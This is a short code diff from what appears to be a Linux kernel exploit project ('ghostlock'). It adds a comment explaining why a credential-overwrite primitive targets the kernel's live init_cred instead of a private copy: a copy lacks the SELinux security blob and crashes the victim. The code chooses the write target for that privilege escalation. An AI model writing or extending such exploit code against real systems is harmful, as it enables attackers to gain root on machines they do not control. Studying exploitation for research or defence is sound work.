@@ -63,6 +63,12 @@ namespace ghostlock::memory {
         if (!request || request->mode == WriteMode::Disabled) return layout;
 
         if (request->preserve_child) {
+            /* Credential writes promote the *real* init_cred: the compact erase
+             * also stores at child-8, and only the live init_cred carries the
+             * SELinux security blob the kernel later dereferences. A private
+             * copy inside the payload has security==NULL and crashes as soon as
+             * the victim runs on the copied credential. The resulting
+             * init_cred+8 side effect is repaired by the W2b prebuilt route. */
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
                                : page_base + 0x100;
